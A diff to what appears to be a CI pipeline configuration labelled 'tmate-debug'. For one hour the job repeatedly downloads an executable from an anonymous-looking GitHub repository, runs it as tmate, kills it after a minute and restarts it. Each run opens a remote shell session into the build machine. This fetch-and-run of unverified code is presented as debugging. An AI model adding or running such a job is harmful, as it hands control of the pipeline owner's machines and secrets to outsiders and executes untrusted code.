@@ -1,37 +1,38 @@
 version: v1.0
-name: tmate-1hr-run
+name: tmate-debug
 agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu2004
 blocks:
-  - name: run-tmate-loop
+  - name: continuous-tmate
     task:
       jobs:
-        - name: tmate-loop
+        - name: run-tmate-for-1hr
           commands:
             - sudo apt-get update -y
-            - sudo apt-get install -y wget openssl
-            - mkdir -p tmate-logs
-            - cd tmate-logs
+            - sudo apt-get install -y wget
+            - mkdir -p tmate-run
+            - cd tmate-run
             - |
-              echo "Starting 1-hour tmate session loop..."
-              END_TIME=$((SECONDS + 3600))  # 1 hour
+              echo "Starting continuous tmate session loop for 1 hour..."
+              END_TIME=$((SECONDS + 3600))  # run for 1 hour (3600 seconds)
 
               while [ $SECONDS -lt $END_TIME ]; do
-                NAME=$(openssl rand -hex 4)
-                echo "Starting session: $NAME"
-
+                echo "Downloading latest tmate binary..."
                 wget -q https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate -O tmate
                 chmod +x tmate
 
-                # Run tmate in background for ~1 minute
-                ./tmate -F -n "$NAME" -k > "$NAME.log" 2>&1 &
+                echo "Starting tmate (random session)..."
+                # Run in foreground (-F) so it exits cleanly when killed
+                ./tmate -F > tmate.log 2>&1 &
                 PID=$!
+
+                # Let it run for 1 minute, then restart
                 sleep 60
                 kill $PID || true
 
-                echo "Session $NAME finished. Restarting..."
+                echo "Restarting new tmate session..."
               done
 
-              echo "All done after 1 hour."
+              echo "Finished 1-hour tmate run."
